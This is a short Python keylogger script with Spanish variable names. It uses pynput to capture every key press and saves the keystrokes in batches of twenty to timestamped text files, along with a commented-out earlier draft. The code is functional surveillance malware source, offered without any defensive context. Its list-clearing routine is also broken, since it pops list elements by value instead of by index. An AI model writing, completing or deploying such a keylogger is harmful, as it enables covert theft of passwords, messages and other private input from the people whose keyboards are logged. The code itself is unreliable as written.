import datetime
from pynput.keyboard import Listener
from io import open

texto=[]

def recorrer(lista):
	Fecha_hora = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
	fichero = open(f"informacion_{Fecha_hora}.txt", "w")
	for i in lista:
		if i == "Key.enter":
			fichero.write("\n")
		elif i == "Key.space":
			fichero.write(" ")
		elif i == "Key.alt_l":
			fichero.write("ALT")
		elif i == "Key.backspace":
			fichero.write("%BORRAR%")
		else:
			fichero.write(i.replace("'", ""))
	fichero.close()

def Borrarlista(lista):
	for i in lista:
		lista.pop(i)



def RecibirDatos(key):
	key = str(key)

	texto.append(key)
	longitud=len(texto)

	if longitud==20:
		recorrer(texto)
		Borrarlista(texto)

with Listener(on_press=RecibirDatos) as l:
	l.join()

""""
				if cont_letra == 20:
					fichero.close()
					cont_letra = 0
					fecha = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
					fichero = open(f"informacion_{fecha}.txt", "w")
				if fichero.closed:
					print (cont_letra)
					print ("Cerrado bien")
					cont_txt=cont_txt+1
				else:
					fichero.write("El archivo no se ha cerrado")

				#fichero = open(f"informacion_{Fecha_hoy}.txt", "w")
				cont_letra=0
				fecha=datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
				fichero = open(f"informacion_{fecha}.txt", "w") """

# fichero.write("\nCantidad de letras %d"%cont_letra)